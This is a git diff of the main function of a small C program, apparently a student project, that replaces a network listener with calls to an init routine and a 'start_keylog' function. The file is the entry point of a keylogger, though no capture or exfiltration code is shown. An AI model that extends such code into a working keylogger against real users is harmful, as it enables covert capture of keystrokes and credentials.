@@ -4,21 +4,18 @@
 ** Made by Moghrabi Alexandre
 ** Login   <alexmog@epitech.net>
 ** 
-** Started on  Thu Jun 26 20:30:48 2014 Moghrabi Alexandre
-** Last update Thu Jun 26 22:24:11 2014 Moghrabi Alexandre
+** Started on  Thu Jul 17 18:11:27 2014 Moghrabi Alexandre
+** Last update Thu Jul 17 18:50:04 2014 Moghrabi Alexandre
 */
 
-#include <unistd.h>
-#include "init.h"
-#include "listen.h"
+#include "selmakey.h"
 
-int		main(void)
+int	main()
 {
-  int		fd;
+  t_kl	kl;
 
-  if (init(&fd))
+  if (init(&kl))
     return (1);
-  start_listening(fd);
-  close(fd);
+  start_keylog(&kl);
   return (0);
 }
